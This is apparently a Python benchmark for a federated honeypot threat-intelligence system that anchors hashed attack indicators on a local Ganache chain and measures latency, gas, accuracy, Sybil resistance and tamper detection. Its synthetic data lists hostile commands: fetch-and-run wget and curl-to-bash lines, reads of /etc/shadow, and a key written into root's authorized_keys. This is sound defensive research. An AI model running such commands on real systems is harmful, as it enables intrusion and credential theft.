"""
Federated honeypot threat-intelligence benchmark, revision 2.

Every value written to federation_results.json is measured against a live
Ganache chain (JSON-RPC over localhost). Nothing is hand-entered.

Run with:  /usr/bin/python3 benchmark_federation.py
Requires:  a Ganache instance on :7545 with >= 20 unlocked accounts, e.g.
           docker run -p 7545:7545 trufflesuite/ganache --chain.chainId 1337 \
               --wallet.totalAccounts 24 --server.port 7545

Experiments
-----------
E1  Scaling: anchor latency and aggregate throughput versus number of
    concurrent writer nodes N in N_SWEEP, REPS repetitions each.
E2  Gas cost: measured gasUsed per anchor for ASCII-hex and binary tag
    encodings, compared against the EIP-2028 calldata model; Merkle
    batching of B digests per transaction for B in BATCH_SWEEP.
E3  Bootstrap cost: wall-clock for a fresh node to scan H blocks of history
    and rebuild the observer map, for increasing H.
E4  Corroboration accuracy under per-target IOC variation: four keying
    functions (exact, payload, /24+template, template) evaluated against
    campaign-level ground truth, reconstructed from chain.
E5  Adversarial writers: (a) fabricated-digest Sybil with c identities under
    threshold k; (b) echo attacker that re-anchors observed digests, with and
    without the commit-reveal scheme.
E6  Tamper detection: T mutated local records across four mutation classes,
    plus T unmodified controls for the false-positive rate.
E7  Centralized aggregator baseline: an in-process HTTP hub receiving the
    same IOC volume from the same number of nodes; latency, throughput, and
    submissions lost during an injected outage.
E8  Propagation: interval from a transaction being mined to a blind polling
    reader observing it.

The nodes are threads inside one process talking to one Ganache instance.
This measures the anchoring, encoding, reconstruction and detection logic;
it does not measure consensus latency on a distributed chain.
"""
import concurrent.futures as cf
import hashlib
import http.server
import json
import math
import random
import re
import statistics
import threading
import time
from pathlib import Path

import requests

GANACHE = "http://localhost:7545"
OUT = Path(__file__).parent / "federation_results.json"
RAW = Path(__file__).parent / "federation_raw.json"

REPS = 5
N_SWEEP = [1, 2, 4, 8, 16]
EVENTS_PER_NODE_SWEEP = 40
BATCH_SWEEP = [1, 2, 4, 8, 16, 32, 64]
BATCH_TRIALS = 10
BOOTSTRAP_H = [250, 500, 1000, 2000, 4000]
N_NODES_ACC = 5
IOCS_PER_NODE_ACC = 60
N_CAMPAIGNS = 16
TAMPER_TRIALS = 500
PROP_TRIALS = 40
POLL_INTERVAL_S = 0.005
HUB_PORT = 8765

_tls = threading.local()


def _session():
    s = getattr(_tls, "s", None)
    if s is None:
        s = requests.Session()
        _tls.s = s
    return s


def rpc(method, params=None, timeout=20):
    r = _session().post(GANACHE, json={
        "jsonrpc": "2.0", "method": method, "params": params or [], "id": 1,
    }, timeout=timeout)
    return r.json().get("result")


def sha256(b: bytes) -> bytes:
    return hashlib.sha256(b).digest()


def hash_ioc(record: dict) -> str:
    return hashlib.sha256(json.dumps(record, sort_keys=True).encode()).hexdigest()


def send(account, data: bytes):
    return rpc("eth_sendTransaction", [{
        "from": account, "to": account, "value": "0x0",
        "data": "0x" + data.hex(), "gas": hex(120000),
    }])


def wait_receipt(txh, timeout=20):
    t0 = time.perf_counter()
    while time.perf_counter() - t0 < timeout:
        r = rpc("eth_getTransactionReceipt", [txh])
        if r:
            return r
        time.sleep(0.002)
    return None


def anchor(account, data: bytes):
    """Submit and wait for the receipt. Returns (latency_ms, receipt)."""
    t0 = time.perf_counter()
    txh = send(account, data)
    rc = wait_receipt(txh)
    return (time.perf_counter() - t0) * 1000.0, rc


def tag_ascii(node_id: str, h_hex: str) -> bytes:
    return f"{node_id}:{h_hex}".encode()


def tag_bin(node_idx: int, h_hex: str) -> bytes:
    return b"\x01" + node_idx.to_bytes(2, "big") + bytes.fromhex(h_hex)


def calldata_gas(data: bytes) -> int:
    z = data.count(0)
    return 21000 + 4 * z + 16 * (len(data) - z)


def block_txs(bn):
    blk = rpc("eth_getBlockByNumber", [hex(bn), True])
    return (blk or {}).get("transactions", [])


def decode_input(tx):
    data = tx.get("input") or "0x"
    try:
        return bytes.fromhex(data[2:])
    except ValueError:
        return b""


def parse_tag(raw: bytes):
    """Returns (node_id, hash_hex) or None for both tag encodings."""
    if len(raw) == 35 and raw[0] == 1:
        return f"node{int.from_bytes(raw[1:3], 'big')}", raw[3:].hex()
    try:
        s = raw.decode()
    except UnicodeDecodeError:
        return None
    m = re.fullmatch(r"([A-Za-z0-9_]+):([0-9a-f]{64})", s)
    return (m.group(1), m.group(2)) if m else None


def reconstruct(b_from, b_to):
    """Fresh-node bootstrap: observer map hash -> set(node_id) over blocks."""
    seen = {}
    for bn in range(b_from, b_to + 1):
        for tx in block_txs(bn):
            p = parse_tag(decode_input(tx))
            if p:
                seen.setdefault(p[1], set()).add(p[0])
    return seen


def stats(xs):
    if not xs:
        return {}
    s = sorted(xs)
    n = len(s)
    mean = statistics.mean(s)
    sd = statistics.stdev(s) if n > 1 else 0.0
    return {
        "n": n, "mean": round(mean, 4), "median": round(statistics.median(s), 4),
        "p95": round(s[min(n - 1, int(math.ceil(0.95 * n)) - 1)], 4),
        "p99": round(s[min(n - 1, int(math.ceil(0.99 * n)) - 1)], 4),
        "min": round(s[0], 4), "max": round(s[-1], 4), "stdev": round(sd, 4),
        "ci95": round(1.96 * sd / math.sqrt(n), 4) if n > 1 else 0.0,
    }


def ci95(xs):
    if len(xs) < 2:
        return 0.0
    return round(1.96 * statistics.stdev(xs) / math.sqrt(len(xs)), 4)


# ---------------------------------------------------------------------------
# E1  scaling sweep
# ---------------------------------------------------------------------------
def _writer(node_idx, account, n_events, rng_seed, encoding="ascii"):
    rng = random.Random(rng_seed)
    lat, gas = [], []
    ok = 0
    for i in range(n_events):
        h = hashlib.sha256(f"{node_idx}-{rng.random()}-{i}".encode()).hexdigest()
        data = tag_ascii(f"node{node_idx}", h) if encoding == "ascii" else tag_bin(node_idx, h)
        ms, rc = anchor(account, data)
        if rc:
            ok += 1
            lat.append(ms)
            gas.append(int(rc["gasUsed"], 16))
    return ok, lat, gas


def e1_scaling(accounts):
    out = []
    for N in N_SWEEP:
        rows = []
        for rep in range(REPS):
            with cf.ThreadPoolExecutor(max_workers=N) as ex:
                t0 = time.perf_counter()
                futs = [ex.submit(_writer, i, accounts[i], EVENTS_PER_NODE_SWEEP, 1000 * rep + i)
                        for i in range(N)]
                res = [f.result() for f in futs]
                wall = time.perf_counter() - t0
            ok = sum(r[0] for r in res)
            lat = [x for r in res for x in r[1]]
            rows.append({"rep": rep, "ok": ok, "attempted": N * EVENTS_PER_NODE_SWEEP,
                         "wall_s": wall, "throughput": ok / wall, "lat": lat})
            print(f"  E1 N={N:2d} rep={rep} ok={ok} wall={wall:.3f}s thr={ok/wall:.1f}/s "
                  f"lat_mean={statistics.mean(lat):.2f}ms")
        thr = [r["throughput"] for r in rows]
        alllat = [x for r in rows for x in r["lat"]]
        out.append({
            "N": N, "events_per_node": EVENTS_PER_NODE_SWEEP, "reps": REPS,
            "attempted": sum(r["attempted"] for r in rows), "ok": sum(r["ok"] for r in rows),
            "throughput_mean": round(statistics.mean(thr), 2), "throughput_ci95": ci95(thr),
            "throughput_per_rep": [round(t, 2) for t in thr],
            "latency_ms": stats(alllat),
            "latency_mean_per_rep": [round(statistics.mean(r["lat"]), 3) for r in rows],
        })
    return out


# ---------------------------------------------------------------------------
# E2  gas: encodings and Merkle batching
# ---------------------------------------------------------------------------
def merkle_root(leaves: list) -> bytes:
    lvl = list(leaves)
    if not lvl:
        return b"\x00" * 32
    while len(lvl) > 1:
        if len(lvl) % 2:
            lvl.append(lvl[-1])
        lvl = [sha256(lvl[i] + lvl[i + 1]) for i in range(0, len(lvl), 2)]
    return lvl[0]


def merkle_proof(leaves: list, idx: int):
    proof = []
    lvl = list(leaves)
    while len(lvl) > 1:
        if len(lvl) % 2:
            lvl.append(lvl[-1])
        sib = idx ^ 1
        proof.append((lvl[sib], sib < idx))
        lvl = [sha256(lvl[i] + lvl[i + 1]) for i in range(0, len(lvl), 2)]
        idx //= 2
    return proof


def merkle_verify(leaf: bytes, proof, root: bytes) -> bool:
    h = leaf
    for sib, left in proof:
        h = sha256(sib + h) if left else sha256(h + sib)
    return h == root


def e2_gas(accounts):
    enc = {}
    for name, fn in (("ascii", lambda i, h: tag_ascii(f"node{i}", h)),
                     ("binary", tag_bin)):
        gas, lat, model = [], [], []
        for i in range(50):
            h = hashlib.sha256(f"gas-{name}-{i}".encode()).hexdigest()
            data = fn(i % 5, h)
            ms, rc = anchor(accounts[i % 5], data)
            gas.append(int(rc["gasUsed"], 16)); lat.append(ms); model.append(calldata_gas(data))
        enc[name] = {"bytes": len(data), "gas_measured": stats(gas), "gas_model": stats(model),
                     "latency_ms": stats(lat),
                     "model_error_pct": round(100 * abs(statistics.mean(gas) - statistics.mean(model)) / statistics.mean(gas), 3)}
        print(f"  E2 enc={name} bytes={len(data)} gas={statistics.mean(gas):.0f} model={statistics.mean(model):.0f}")

    batch = []
    for B in BATCH_SWEEP:
        gas, lat, proofs_ok, proof_len = [], [], 0, 0
        for t in range(BATCH_TRIALS):
            leaves = [sha256(f"b{B}-{t}-{j}".encode()) for j in range(B)]
            root = merkle_root(leaves)
            data = b"\x02" + (0).to_bytes(2, "big") + root + B.to_bytes(2, "big")
            ms, rc = anchor(accounts[t % 5], data)
            gas.append(int(rc["gasUsed"], 16)); lat.append(ms)
            for j in range(B):
                pr = merkle_proof(leaves, j)
                proof_len = len(pr)
                proofs_ok += merkle_verify(leaves[j], pr, root)
        batch.append({
            "B": B, "trials": BATCH_TRIALS, "tx_bytes": len(data),
            "gas_per_tx": stats(gas), "gas_per_ioc": round(statistics.mean(gas) / B, 1),
            "latency_per_tx_ms": stats(lat), "latency_per_ioc_ms": round(statistics.mean(lat) / B, 4),
            "proof_hashes": proof_len, "proof_bytes": proof_len * 32,
            "proofs_verified": proofs_ok, "proofs_total": B * BATCH_TRIALS,
        })
        print(f"  E2 B={B:3d} gas/tx={statistics.mean(gas):.0f} gas/ioc={statistics.mean(gas)/B:.0f} proofs={proofs_ok}/{B*BATCH_TRIALS}")
    return {"encoding": enc, "batching": batch}


# ---------------------------------------------------------------------------
# E3  bootstrap cost vs history length
# ---------------------------------------------------------------------------
def e3_bootstrap(head):
    rows = []
    for H in BOOTSTRAP_H:
        if H > head:
            break
        times, ntx, nrec = [], 0, 0
        for rep in range(3):
            t0 = time.perf_counter()
            seen = {}
            cnt = 0
            for bn in range(head - H + 1, head + 1):
                for tx in block_txs(bn):
                    cnt += 1
                    p = parse_tag(decode_input(tx))
                    if p:
                        seen.setdefault(p[1], set()).add(p[0])
            times.append(time.perf_counter() - t0)
            ntx, nrec = cnt, len(seen)
        rows.append({"H": H, "seconds_mean": round(statistics.mean(times), 4), "seconds_ci95": ci95(times),
                     "ms_per_block": round(1000 * statistics.mean(times) / H, 4),
                     "transactions_scanned": ntx, "records_recovered": nrec})
        print(f"  E3 H={H} t={statistics.mean(times):.3f}s ({1000*statistics.mean(times)/H:.2f} ms/block)")
    # least-squares slope
    xs = [r["H"] for r in rows]; ys = [r["seconds_mean"] for r in rows]
    if len(xs) >= 2:
        mx, my = statistics.mean(xs), statistics.mean(ys)
        slope = sum((x - mx) * (y - my) for x, y in zip(xs, ys)) / sum((x - mx) ** 2 for x in xs)
        icpt = my - slope * mx
        ss_res = sum((y - (slope * x + icpt)) ** 2 for x, y in zip(xs, ys))
        ss_tot = sum((y - my) ** 2 for y in ys)
        fit = {"ms_per_block": round(1000 * slope, 4), "intercept_ms": round(1000 * icpt, 2),
               "r2": round(1 - ss_res / ss_tot, 5) if ss_tot else 1.0}
    else:
        fit = {}
    return {"rows": rows, "fit": fit}


# ---------------------------------------------------------------------------
# E4  corroboration accuracy under per-target variation
# ---------------------------------------------------------------------------
TEMPLATES = [
    "wget http://185.220.101.4/x.sh?id={tok} -O /tmp/.x && sh /tmp/.x",
    "curl -s http://{host}/miner/{tok} | bash",
    "SELECT * FROM users WHERE '1'='1' /* {tok} */",
    "personal_unlockAccount {tok}",
    "cat /etc/shadow; echo {tok}",
    "id; uname -a; echo {tok}",
    "nmap -sS 10.0.{oct}.0/24",
    "echo {tok} > /root/.ssh/authorized_keys",
]
GENERIC = ["cat /etc/passwd", "id", "uname -a", "ls -la /", "whoami",
           "SELECT version()", "eth_accounts", "GET /.env"]


MODES = ["fixed", "token", "ip", "token+ip", "net"]


def _campaign_ioc(rng, camp):
    """One observation of a campaign at one target. 'fixed' campaigns repeat
    the same record everywhere; the other modes vary the session token, the
    source host inside the campaign's /24, both, or the source /24 itself."""
    tok = camp["tok"] if camp["mode"] in ("fixed", "ip", "net") else "%08x" % rng.getrandbits(32)
    host = camp["host"] if camp["mode"] in ("fixed", "token") else rng.randint(1, 254)
    prefix = camp["prefix"]
    if camp["mode"] == "net":   # distributed source: each target sees a different /24
        prefix = f"{rng.randint(1,223)}.{rng.randint(0,255)}.{rng.randint(0,255)}"
    payload = camp["tmpl"].format(tok=tok, host=f"{camp['prefix']}.{camp['c2']}", oct=camp["oct"])
    return {"attacker_ip": f"{prefix}.{host}", "payload": payload}


def _noise_ioc(rng):
    return {"attacker_ip": f"{rng.randint(1,223)}.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
            "payload": rng.choice(GENERIC)}


def build_variation_dataset(seed):
    """Each campaign hits m>=2 nodes from one /24 with one payload template
    and a randomly drawn variation mode. Noise IOCs use generic payloads that
    unrelated attackers also produce."""
    rng = random.Random(seed)
    campaigns = []
    for c in range(N_CAMPAIGNS):
        campaigns.append({
            "id": c, "prefix": f"{rng.randint(1,223)}.{rng.randint(0,255)}.{rng.randint(0,255)}",
            "targets": rng.sample(range(N_NODES_ACC), rng.randint(2, N_NODES_ACC)),
            "tmpl": rng.choice(TEMPLATES), "mode": rng.choice(MODES),
            "tok": "%08x" % rng.getrandbits(32), "host": rng.randint(1, 254),
            "c2": rng.randint(1, 254), "oct": rng.randint(1, 254),
        })
    streams = [[] for _ in range(N_NODES_ACC)]
    for camp in campaigns:
        for n in camp["targets"]:
            streams[n].append((camp["id"], _campaign_ioc(rng, camp)))
    for n in range(N_NODES_ACC):
        while len(streams[n]) < IOCS_PER_NODE_ACC:
            streams[n].append((None, _noise_ioc(rng)))
        rng.shuffle(streams[n])
    return campaigns, streams


def key_exact(r):     return json.dumps(r, sort_keys=True)
def key_payload(r):   return r["payload"]
def key_template(r):  return re.sub(r"[0-9a-f]{8}|\d+\.\d+\.\d+\.\d+", "#", r["payload"])
def key_net_tmpl(r):  return ".".join(r["attacker_ip"].split(".")[:3]) + "|" + key_template(r)


KEYS = {"exact": key_exact, "payload": key_payload, "template": key_template, "net24+template": key_net_tmpl}


def e4_accuracy(accounts):
    rows = {k: [] for k in KEYS}
    for rep in range(REPS):
        campaigns, streams = build_variation_dataset(500 + rep)
        multi = {c["id"] for c in campaigns if len(c["targets"]) >= 2}
        mode_mix = {m: sum(1 for c in campaigns if c["mode"] == m) for m in MODES}
        for kname, kfn in KEYS.items():
            # anchor every observation under this keying function
            label = {}  # key hash -> list of (node, campaign)
            b0 = int(rpc("eth_blockNumber"), 16) + 1
            for n, stream in enumerate(streams):
                for camp, rec in stream:
                    h = hashlib.sha256(kfn(rec).encode()).hexdigest()
                    label.setdefault(h, []).append((n, camp))
                    anchor(accounts[n], tag_ascii(f"node{n}", h))
            b1 = int(rpc("eth_blockNumber"), 16)
            seen = reconstruct(b0, b1)
            corro = {h for h, s in seen.items() if len(s) >= 2}
            tp = fp = 0
            found = set()
            for h in corro:
                camps = {c for _, c in label[h]}
                if len(camps) == 1 and None not in camps:
                    tp += 1; found |= camps
                else:
                    fp += 1
            fn = len(multi - found)
            prec = tp / (tp + fp) if tp + fp else 0.0
            rec_ = len(found & multi) / len(multi)
            f1 = 2 * prec * rec_ / (prec + rec_) if prec + rec_ else 0.0
            rows[kname].append({"rep": rep, "tp": tp, "fp": fp, "fn": fn, "precision": prec,
                                "recall": rec_, "f1": f1, "anchored": sum(len(s) for s in streams),
                                "distinct_keys": len(seen), "mode_mix": mode_mix})
            print(f"  E4 rep={rep} key={kname:15s} P={prec:.3f} R={rec_:.3f} F1={f1:.3f} tp={tp} fp={fp} fn={fn}")
    summ = {}
    for k, rs in rows.items():
        summ[k] = {m: round(statistics.mean(r[m] for r in rs), 4) for m in ("precision", "recall", "f1")}
        summ[k].update({m + "_ci95": ci95([r[m] for r in rs]) for m in ("precision", "recall", "f1")})
        summ[k].update({"tp": sum(r["tp"] for r in rs), "fp": sum(r["fp"] for r in rs), "fn": sum(r["fn"] for r in rs)})
    return {"summary": summ, "per_rep": rows, "campaigns": N_CAMPAIGNS, "nodes": N_NODES_ACC,
            "iocs_per_node": IOCS_PER_NODE_ACC, "reps": REPS}


# ---------------------------------------------------------------------------
# E5  adversarial writers
# ---------------------------------------------------------------------------
def e5_adversary(accounts):
    # (a) Sybil fabrication: c colluding identities anchor F fabricated digests
    F = 30
    sybil = []
    for c in (1, 2, 3):
        b0 = int(rpc("eth_blockNumber"), 16) + 1
        fakes = [hashlib.sha256(f"fake-{c}-{i}".encode()).hexdigest() for i in range(F)]
        for i, h in enumerate(fakes):
            for j in range(c):
                anchor(accounts[16 + j], tag_ascii(f"sybil{j}", h))
        b1 = int(rpc("eth_blockNumber"), 16)
        seen = reconstruct(b0, b1)
        row = {"identities": c, "fabricated": F}
        for k in (2, 3, 4):
            row[f"corroborated_k{k}"] = sum(1 for h in fakes if len(seen.get(h, ())) >= k)
        sybil.append(row)
        print(f"  E5a c={c} {row}")

    # (b) echo attacker, plain scheme
    rng = random.Random(77)
    honest = {n: [hashlib.sha256(f"echo-{n}-{i}-{rng.random()}".encode()).hexdigest() for i in range(40)]
              for n in range(3)}
    b0 = int(rpc("eth_blockNumber"), 16) + 1
    for n, hs in honest.items():
        for h in hs:
            anchor(accounts[n], tag_ascii(f"node{n}", h))
    b_mid = int(rpc("eth_blockNumber"), 16)
    observed = reconstruct(b0, b_mid)  # attacker reads chain
    t_echo0 = time.perf_counter()
    for h in observed:
        anchor(accounts[19], tag_ascii("echo", h))
    echo_s = time.perf_counter() - t_echo0
    b1 = int(rpc("eth_blockNumber"), 16)
    seen = reconstruct(b0, b1)
    singles = [h for hs in honest.values() for h in hs]
    plain_fp = sum(1 for h in singles if len(seen[h]) >= 2)
    plain = {"honest_single_node_digests": len(singles), "falsely_corroborated": plain_fp,
             "false_corroboration_rate": round(plain_fp / len(singles), 4), "echo_cost_s": round(echo_s, 3)}
    print(f"  E5b plain: {plain}")

    # (c) commit-reveal: commit = H(node||salt||h); reveal after all commits
    def commit_tag(n, salt, h):
        return b"C:" + f"node{n}:".encode() + hashlib.sha256(f"node{n}|{salt}|{h}".encode()).digest()

    def reveal_tag(n, salt, h):
        return f"R:node{n}:{salt}:{h}".encode()

    def parse_cr(raw):
        if raw.startswith(b"C:"):
            nid, _, dig = raw[2:].partition(b":")
            return ("C", nid.decode(), dig.hex())
        try:
            s = raw.decode()
        except UnicodeDecodeError:
            return None
        m = re.fullmatch(r"R:([A-Za-z0-9_]+):([0-9a-f]{16}):([0-9a-f]{64})", s)
        return ("R", m.group(1), m.group(2), m.group(3)) if m else None

    def reconstruct_cr(b_from, b_to):
        commits = {}   # (node, commit_hex) -> block
        reveals = []   # (block, node, salt, h)
        for bn in range(b_from, b_to + 1):
            for tx in block_txs(bn):
                p = parse_cr(decode_input(tx))
                if not p:
                    continue
                if p[0] == "C":
                    commits.setdefault((p[1], p[2]), bn)
                else:
                    reveals.append((bn, p[1], p[2], p[3]))
        first_reveal = {}
        for bn, _, _, h in reveals:
            first_reveal[h] = min(first_reveal.get(h, bn), bn)
        seen, rejected = {}, 0
        for bn, nid, salt, h in reveals:
            c = hashlib.sha256(f"{nid}|{salt}|{h}".encode()).hexdigest()
            cb = commits.get((nid, c))
            if cb is not None and cb < first_reveal[h]:
                seen.setdefault(h, set()).add(nid)
            else:
                rejected += 1
        return seen, rejected

    # shared digests across two honest nodes to check recall survives
    rng = random.Random(78)
    shared = [hashlib.sha256(f"cr-shared-{i}".encode()).hexdigest() for i in range(20)]
    own = {n: [hashlib.sha256(f"cr-{n}-{i}-{rng.random()}".encode()).hexdigest() for i in range(30)] for n in range(3)}
    plan = {n: list(own[n]) for n in range(3)}
    plan[0] += shared; plan[1] += shared
    salts = {(n, h): "%016x" % rng.getrandbits(64) for n in plan for h in plan[n]}
    gas_c, gas_r, lat_c, lat_r = [], [], [], []
    b0 = int(rpc("eth_blockNumber"), 16) + 1
    for n in plan:
        for h in plan[n]:
            ms, rc = anchor(accounts[n], commit_tag(n, salts[(n, h)], h))
            gas_c.append(int(rc["gasUsed"], 16)); lat_c.append(ms)
    b_commit_end = int(rpc("eth_blockNumber"), 16)
    for n in plan:
        for h in plan[n]:
            ms, rc = anchor(accounts[n], reveal_tag(n, salts[(n, h)], h))
            gas_r.append(int(rc["gasUsed"], 16)); lat_r.append(ms)
    b_reveal_end = int(rpc("eth_blockNumber"), 16)
    # attacker sees reveals, tries to echo with its own commit + reveal
    seen_att, _ = reconstruct_cr(b0, b_reveal_end)
    for h in seen_att:
        s = "%016x" % rng.getrandbits(64)
        anchor(accounts[19], commit_tag(19, s, h))
        anchor(accounts[19], reveal_tag(19, s, h))
    b1 = int(rpc("eth_blockNumber"), 16)
    seen_cr, rejected = reconstruct_cr(b0, b1)
    all_single = [h for n in own for h in own[n]]
    cr_fp = sum(1 for h in all_single if len(seen_cr.get(h, ())) >= 2)
    cr_recall = sum(1 for h in shared if len(seen_cr.get(h, ())) >= 2) / len(shared)
    commit_reveal = {
        "honest_single_node_digests": len(all_single), "falsely_corroborated": cr_fp,
        "false_corroboration_rate": round(cr_fp / len(all_single), 4),
        "shared_digests": len(shared), "corroboration_recall": round(cr_recall, 4),
        "echo_reveals_rejected": rejected,
        "gas_commit": stats(gas_c), "gas_reveal": stats(gas_r),
        "gas_per_ioc_total": round(statistics.mean(gas_c) + statistics.mean(gas_r), 1),
        "latency_commit_ms": stats(lat_c), "latency_reveal_ms": stats(lat_r),
        "commit_bytes": len(commit_tag(0, "0" * 16, "0" * 64)), "reveal_bytes": len(reveal_tag(0, "0" * 16, "0" * 64)),
    }
    print(f"  E5c commit-reveal: fp={cr_fp} recall={cr_recall} rejected={rejected} gas/ioc={commit_reveal['gas_per_ioc_total']}")
    return {"sybil": sybil, "echo_plain": plain, "echo_commit_reveal": commit_reveal}


# ---------------------------------------------------------------------------
# E6  tamper detection
# ---------------------------------------------------------------------------
def e6_tamper(accounts):
    rng = random.Random(91)
    records = []
    b0 = int(rpc("eth_blockNumber"), 16) + 1
    for i in range(TAMPER_TRIALS):
        rec = _noise_ioc(rng); rec["payload"] += f" #{i}"
        n = i % 5
        h = hash_ioc(rec)
        anchor(accounts[n], tag_ascii(f"node{n}", h))
        records.append((n, rec, h))
    b1 = int(rpc("eth_blockNumber"), 16)
    seen = reconstruct(b0, b1)

    def mutate(rec, kind):
        r = json.loads(json.dumps(rec))
        if kind == "payload_append":
            r["payload"] += "-FORGED"
        elif kind == "ip_change":
            o = r["attacker_ip"].split("."); o[3] = str((int(o[3]) % 254) + 1); r["attacker_ip"] = ".".join(o)
        elif kind == "field_drop":
            del r["attacker_ip"]
        elif kind == "bit_flip":
            b = bytearray(r["payload"].encode()); b[0] ^= 0x01; r["payload"] = b.decode(errors="ignore")
        return r

    kinds = ["payload_append", "ip_change", "field_drop", "bit_flip"]
    per_kind = {k: {"trials": 0, "detected": 0} for k in kinds}
    t_det = []
    for i, (n, rec, h) in enumerate(records):
        kind = kinds[i % 4]
        t0 = time.perf_counter()
        forged = mutate(rec, kind)
        fh = hash_ioc(forged)
        detected = (h in seen and f"node{n}" in seen[h]) and (fh not in seen)
        t_det.append((time.perf_counter() - t0) * 1e6)
        per_kind[kind]["trials"] += 1
        per_kind[kind]["detected"] += int(detected)
    controls_flagged = 0
    for n, rec, h in records:
        hh = hash_ioc(rec)
        if not (hh in seen and f"node{n}" in seen[hh]):
            controls_flagged += 1
    det = sum(v["detected"] for v in per_kind.values())
    print(f"  E6 detected={det}/{TAMPER_TRIALS} controls_flagged={controls_flagged}")
    return {"trials": TAMPER_TRIALS, "detected": det, "per_kind": per_kind,
            "controls": TAMPER_TRIALS, "controls_flagged": controls_flagged,
            "check_time_us": stats(t_det)}


# ---------------------------------------------------------------------------
# E7  centralized hub baseline
# ---------------------------------------------------------------------------
class _Hub(http.server.BaseHTTPRequestHandler):
    store = []
    lock = threading.Lock()

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(n)
        with _Hub.lock:
            _Hub.store.append(body)
        self.send_response(200); self.send_header("Content-Length", "2"); self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *a):
        pass


def _start_hub():
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", HUB_PORT), _Hub)
    th = threading.Thread(target=srv.serve_forever, daemon=True); th.start()
    return srv


def _hub_writer(node, n_events, stop_at=None):
    s = requests.Session()
    lat, ok, failed = [], 0, 0
    for i in range(n_events):
        body = json.dumps({"node": node, "hash": hashlib.sha256(f"hub-{node}-{i}".encode()).hexdigest()})
        t0 = time.perf_counter()
        try:
            r = s.post(f"http://127.0.0.1:{HUB_PORT}/ioc", data=body, timeout=2)
            if r.status_code == 200:
                ok += 1; lat.append((time.perf_counter() - t0) * 1000)
            else:
                failed += 1
        except requests.RequestException:
            failed += 1
    return ok, failed, lat


def e7_hub():
    out = {}
    for N in N_SWEEP:
        _Hub.store = []
        srv = _start_hub()
        thr, lats = [], []
        for rep in range(REPS):
            with cf.ThreadPoolExecutor(max_workers=N) as ex:
                t0 = time.perf_counter()
                res = list(ex.map(lambda n: _hub_writer(n, EVENTS_PER_NODE_SWEEP), range(N)))
                wall = time.perf_counter() - t0
            ok = sum(r[0] for r in res)
            thr.append(ok / wall); lats += [x for r in res for x in r[2]]
        srv.shutdown(); srv.server_close()
        out[str(N)] = {"N": N, "throughput_mean": round(statistics.mean(thr), 2), "throughput_ci95": ci95(thr),
                       "latency_ms": stats(lats)}
        print(f"  E7 hub N={N} thr={statistics.mean(thr):.0f}/s lat={statistics.mean(lats):.3f}ms")

    # outage injection: hub killed after half the run; count lost submissions
    _Hub.store = []
    srv = _start_hub()
    N, E = 5, 100
    killer = threading.Timer(0.0, lambda: None)
    results = []

    def run_node(n):
        return _hub_writer(n, E)

    with cf.ThreadPoolExecutor(max_workers=N) as ex:
        futs = [ex.submit(run_node, n) for n in range(N)]
        # kill once roughly half the submissions have landed
        while len(_Hub.store) < N * E // 2:
            time.sleep(0.001)
        srv.shutdown(); srv.server_close()
        results = [f.result() for f in futs]
    ok = sum(r[0] for r in results); failed = sum(r[1] for r in results)
    outage = {"nodes": N, "events_per_node": E, "attempted": N * E, "accepted_before_outage": ok,
              "rejected_during_outage": failed, "held_in_hub_memory": len(_Hub.store),
              "recoverable_by_third_party_after_crash": 0}
    print(f"  E7 outage: {outage}")
    return {"sweep": out, "outage": outage}


# ---------------------------------------------------------------------------
# E8  propagation to a blind poller
# ---------------------------------------------------------------------------
def e8_propagation(accounts):
    lat, found_n = [], 0
    for i in range(PROP_TRIALS):
        h = hashlib.sha256(f"prop-{i}".encode()).hexdigest()
        txh = send(accounts[i % 5], tag_ascii("propnode", h))
        rc = wait_receipt(txh)
        t_mined = time.perf_counter()
        bn = int(rc["blockNumber"], 16)
        found = False
        t_start = time.perf_counter()
        while time.perf_counter() - t_start < 10 and not found:
            for tx in block_txs(bn):
                p = parse_tag(decode_input(tx))
                if p and p[1] == h:
                    found = True; break
            if not found:
                time.sleep(POLL_INTERVAL_S)
        if found:
            found_n += 1; lat.append((time.perf_counter() - t_mined) * 1000)
    print(f"  E8 found={found_n}/{PROP_TRIALS} mean={statistics.mean(lat):.3f}ms")
    return {"trials": PROP_TRIALS, "observed": found_n, "latency_ms": stats(lat)}


def rpc_floor():
    xs = []
    for _ in range(200):
        t0 = time.perf_counter(); rpc("eth_blockNumber"); xs.append((time.perf_counter() - t0) * 1000)
    return stats(xs)


def main():
    client = rpc("web3_clientVersion"); chain_id = int(rpc("eth_chainId"), 16)
    accounts = rpc("eth_accounts")
    assert len(accounts) >= 20, "need >= 20 accounts"
    print(f"{client} chainId={chain_id} accounts={len(accounts)}")
    t_all = time.perf_counter()
    b_start = int(rpc("eth_blockNumber"), 16)

    print("[RPC] round-trip floor"); floor = rpc_floor()
    print("[E1] scaling");           e1 = e1_scaling(accounts)
    print("[E2] gas and batching");  e2 = e2_gas(accounts)
    print("[E4] accuracy");          e4 = e4_accuracy(accounts)
    print("[E5] adversary");         e5 = e5_adversary(accounts)
    print("[E6] tamper");            e6 = e6_tamper(accounts)
    print("[E8] propagation");       e8 = e8_propagation(accounts)
    head = int(rpc("eth_blockNumber"), 16)
    print(f"[E3] bootstrap (head={head})"); e3 = e3_bootstrap(head)
    print("[E7] hub baseline");      e7 = e7_hub()

    results = {
        "meta": {
            "generated": time.strftime("%Y-%m-%dT%H:%M:%S"),
            "ganache_client": client, "chain_id": chain_id, "accounts": len(accounts),
            "blocks_produced": head - b_start, "total_runtime_s": round(time.perf_counter() - t_all, 1),
            "reps": REPS, "n_sweep": N_SWEEP, "events_per_node_sweep": EVENTS_PER_NODE_SWEEP,
            "rpc_floor_ms": floor,
        },
        "e1_scaling": e1, "e2_gas": e2, "e3_bootstrap": e3, "e4_accuracy": e4,
        "e5_adversary": e5, "e6_tamper": e6, "e7_hub": e7, "e8_propagation": e8,
    }
    OUT.write_text(json.dumps(results, indent=2))
    print(f"\nWrote {OUT}  ({results['meta']['total_runtime_s']} s, {results['meta']['blocks_produced']} blocks)")


if __name__ == "__main__":
    main()
